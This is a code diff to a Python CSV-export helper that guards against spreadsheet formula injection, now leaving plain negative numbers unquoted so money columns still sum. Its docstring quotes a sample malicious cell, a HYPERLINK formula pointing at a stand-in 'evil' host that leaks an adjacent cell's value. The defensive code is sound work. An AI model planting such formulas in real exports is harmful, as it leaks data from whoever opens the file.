@@ -32,6 +32,9 @@ def attachment_filename(value, fallback="download"):
 #: Excel skips before deciding.
 _CSV_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
 
+#: A plain number, which is what a leading ``-`` or ``+`` almost always is here.
+_CSV_NUMBER = re.compile(r"[+-]?(?:\d+(?:\.\d*)?|\.\d+)(?:[eE][+-]?\d+)?\Z")
+
 
 def csv_cell(value):
     """One CSV cell, safe to open in a spreadsheet.
@@ -39,11 +42,16 @@ def csv_cell(value):
     Excel, Sheets and LibreOffice run a cell beginning ``=``, ``+``, ``-`` or ``@`` as a formula, so
     a lot named ``=HYPERLINK("https://evil/"&A1,"Open")`` fires when an organizer opens the export.
     Prefixing a single quote makes it text; the quote is not shown in the cell.
+
+    A cell that is only a number is left alone. ``-`` heads the prefix list, and money in these
+    exports goes negative -- an expense in the treasurer report, an invoice the club owes -- so
+    quoting those would turn every such column into text and stop it adding up, which is the one
+    thing a treasurer opens the file to do. A number is not a formula.
     """
     if value is None:
         return ""
     text = str(value)
-    if text.startswith(_CSV_FORMULA_PREFIXES):
+    if text.startswith(_CSV_FORMULA_PREFIXES) and not _CSV_NUMBER.match(text):
         return "'" + text
     return text
 
